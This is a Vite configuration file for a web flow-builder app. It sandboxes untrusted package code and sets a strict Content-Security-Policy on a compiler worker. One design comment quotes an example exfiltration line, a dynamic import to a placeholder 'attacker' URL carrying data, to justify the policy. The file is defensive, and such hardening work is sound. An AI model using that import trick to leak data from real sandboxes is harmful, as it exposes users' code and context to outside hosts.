import { defineConfig } from 'vite'
import type { ViteDevServer, PreviewServer } from 'vite'
import react from '@vitejs/plugin-react'
import path from 'path'
import * as esbuild from 'esbuild'
import type { IncomingMessage, ServerResponse } from 'node:http'

// Bundles the custom-node-UI sandbox runner (src/sandbox/sandbox-main.tsx) into a
// self-contained IIFE string exposed as `virtual:sandbox-runtime`. The host inlines this
// into a sandboxed iframe's srcdoc (opaque origin + CSP) so untrusted package UI code
// runs fully isolated. Inlining (vs an external module script) is REQUIRED: an
// opaque-origin iframe cannot load a cross-origin ES module — CORS forbids it.
function sandboxRuntimePlugin() {
  const virtualId = 'virtual:sandbox-runtime'
  const resolvedId = '\0' + virtualId
  return {
    name: 'oaiy-sandbox-runtime',
    resolveId(id: string) {
      if (id === virtualId) return resolvedId
    },
    async load(id: string) {
      if (id !== resolvedId) return
      const result = await esbuild.build({
        entryPoints: [path.resolve(__dirname, 'src/sandbox/sandbox-main.tsx')],
        bundle: true,
        format: 'iife',
        platform: 'browser',
        target: 'es2020',
        jsx: 'automatic',
        minify: true,
        write: false,
        absWorkingDir: __dirname,
        define: { 'process.env.NODE_ENV': '"production"' },
      })
      return `export default ${JSON.stringify(result.outputFiles[0].text)}`
    },
  }
}

// The compiler sandbox worker (src/sandbox/compiler-sandbox-worker.ts) runs UNTRUSTED package
// compiler code. Its in-realm egress blocklist can't stop a dynamic import('https://attacker/?d=…')
// — that's syntax, not a global, and it reaches the network in module AND classic workers (verified)
// to exfiltrate the compile context. A restrictive CSP on the worker's OWN response closes it:
// `script-src 'self'` blocks the cross-origin import, `connect-src 'none'` blocks fetch-based egress,
// `'unsafe-eval'` keeps `new Function` (the compiler) working — while the rest of the app keeps its
// permissive connect-src for flow HTTP. This plugin sets the header in DEV + PREVIEW; production
// static hosts get it from ui/public/_headers, and the Tauri asset responder needs the equivalent
// (see the worker file's header comment).
const WORKER_CSP =
  "default-src 'none'; script-src 'self' 'unsafe-eval'; connect-src 'none'; worker-src 'none'"
function compilerWorkerCspPlugin() {
  const mw = (req: IncomingMessage, res: ServerResponse, next: () => void) => {
    if (req.url && req.url.includes('compiler-sandbox-worker')) {
      res.setHeader('Content-Security-Policy', WORKER_CSP)
    }
    next()
  }
  return {
    name: 'oaiy-compiler-worker-csp',
    configureServer(server: ViteDevServer) {
      server.middlewares.use(mw)
    },
    configurePreviewServer(server: PreviewServer) {
      server.middlewares.use(mw)
    },
  }
}

// oaiy-web/ui is a STANDALONE project: the oaiy-core engine and
// oaiy-ui-components are vendored under ui/vendor/ (see resolve.alias below),
// so there is no dependency on the sibling monorepo. The API server is the
// sibling oaiy-web/api/.
const shim = (p: string) => path.resolve(__dirname, 'src/tauri-shim', p)

// https://vite.dev/config/
export default defineConfig({
  plugins: [react(), sandboxRuntimePlugin(), compilerWorkerCspPlugin()],
  resolve: {
    dedupe: ['react', 'react-dom', '@xyflow/react'],
    // Array form: matched top-to-bottom, so list the most specific finds first.
    alias: [
      // --- Tauri bridge → browser shims (this is the whole "host shell" swap) ---
      { find: '@tauri-apps/api/core', replacement: shim('core.ts') },
      { find: '@tauri-apps/api/event', replacement: shim('event.ts') },
      { find: '@tauri-apps/plugin-dialog', replacement: shim('dialog.ts') },
      { find: '@tauri-apps/plugin-fs', replacement: shim('fs.ts') },
      { find: '@tauri-apps/plugin-sql', replacement: shim('sql.ts') },

      // --- single React instance (mirror desktop) ---
      { find: /^react$/, replacement: path.resolve(__dirname, 'node_modules/react') },
      { find: /^react-dom$/, replacement: path.resolve(__dirname, 'node_modules/react-dom') },
      { find: '@monaco-editor/react', replacement: path.resolve(__dirname, 'node_modules/@monaco-editor/react') },

      // --- vendored OAIY packages (standalone — no sibling-repo dependency) ---
      // Order matters (first match wins): oaiy-core/modules/* resolves to the
      // web's bundled module copies; bare oaiy-core → the vendored source index;
      // every other oaiy-core/* subpath → the vendored source tree.
      { find: /^oaiy-core\/modules\/(.*)$/, replacement: path.resolve(__dirname, 'src/bundled-modules/$1') },
      { find: /^oaiy-core$/, replacement: path.resolve(__dirname, 'vendor/oaiy-core/src/index.ts') },
      { find: /^oaiy-core\/(.*)$/, replacement: path.resolve(__dirname, 'vendor/oaiy-core/$1') },
      { find: /^oaiy-ui-components$/, replacement: path.resolve(__dirname, 'vendor/oaiy-ui-components/src/index.ts') },
      { find: /^oaiy-ui-components\/(.*)$/, replacement: path.resolve(__dirname, 'vendor/oaiy-ui-components/src/$1') },
    ],
  },
  optimizeDeps: {
    // sqlite-wasm ships its own .wasm + worker; let it load untouched.
    exclude: ['@sqlite.org/sqlite-wasm'],
  },
  esbuild: {
    // Strip debug-level console noise + `debugger` from the PRODUCTION bundle
    // (these only take effect under minification, so dev keeps full logging).
    // `pure` lets esbuild dead-code-eliminate log/info/debug call sites — incl.
    // the engine's per-module-registration log and any stray debug prints —
    // while deliberately KEEPING console.warn/error so genuine errors still
    // surface to users + the console buffer. logger.ts also gates 'debug' by env.
    pure: ['console.log', 'console.info', 'console.debug'],
    drop: ['debugger'],
  },
  server: {
    fs: {
      // Vendored packages live under ui/vendor (see resolve.alias), so the dev
      // server never needs to read outside the project root. Scoping to __dirname
      // keeps the api/ PHP backend + its SQLite DB (var/oaiy.sqlite), cli/, and
      // desktop/ out of reach of the dev server's /@fs/ route.
      allow: [__dirname],
    },
    // Note: to switch ffmpeg.wasm to its multi-threaded build (3-5×
    // faster) we'll need to add COOP/COEP here (and in production
    // hosting) to enable SharedArrayBuffer:
    //
    //   headers: {
    //     'Cross-Origin-Opener-Policy': 'same-origin',
    //     'Cross-Origin-Embedder-Policy': 'require-corp',
    //   }
    //
    // Doing so requires every cross-origin resource (image, font, fetched
    // worker) to advertise `Cross-Origin-Resource-Policy: cross-origin`
    // OR be loaded with the `crossorigin` attribute — easy to miss and
    // hard to debug after the fact. The single-threaded ffmpeg-core
    // shipped today works without these headers, so we defer the switch
    // until the MT speedup is actually needed.
  },
  build: {
    rollupOptions: {
      // Multi-page build: the marketing landing page is the root entry
      // (index.html → src/landing/main.tsx), and the full flow builder
      // lives at /app.html (app.html → src/main.tsx). Both emit as real
      // static files so a plain static host needs no rewrite rules, and
      // shared-flow links (origin + pathname + ?flow=) resolve to
      // /app.html automatically.
      input: {
        main: path.resolve(__dirname, 'index.html'),
        app: path.resolve(__dirname, 'app.html'),
        desktop: path.resolve(__dirname, 'desktop.html'),
      },
      output: {
        // Function form lets us split the oaiy monorepo packages out of
        // the main chunk too. The previous object-form was missing them,
        // so the main bundle was ~1.16 MB. Now oaiy-core, the bundled
        // modules, and oaiy-ui-components each get their own chunk —
        // browsers cache them independently and an edit to one no
        // longer invalidates the whole main bundle.
        manualChunks: (id) => {
          if (id.includes('@monaco-editor/react')) return 'monaco';
          if (id.includes('@xyflow/react') || id.includes('dagre')) return 'xyflow';
          // Match the exact react/react-dom in node_modules (not e.g. react-dnd).
          // Backslash handles Windows paths.
          if (/[\\/]node_modules[\\/]react[\\/]/.test(id)) return 'react-vendor';
          if (/[\\/]node_modules[\\/]react-dom[\\/]/.test(id)) return 'react-vendor';
          if (id.includes('esbuild-wasm')) return 'esbuild';
          if (id.includes('@sqlite.org/sqlite-wasm')) return 'sqlite-wasm';
          // Vendored OAIY packages live under ui/vendor/ now (resolved via
          // resolve.alias). Keep each in its own cacheable chunk; the bundled
          // web modules chunk together.
          if (id.includes('/src/bundled-modules/')) return 'oaiy-modules';
          if (id.includes('/vendor/oaiy-core/')) return 'oaiy-core';
          if (id.includes('/vendor/oaiy-ui-components/')) return 'oaiy-ui';
          // Everything else falls through to Vite's default (per-route
          // / lazy-loaded chunks stay as Vite intended).
          return undefined;
        },
      },
    },
    chunkSizeWarningLimit: 800,
  },
})
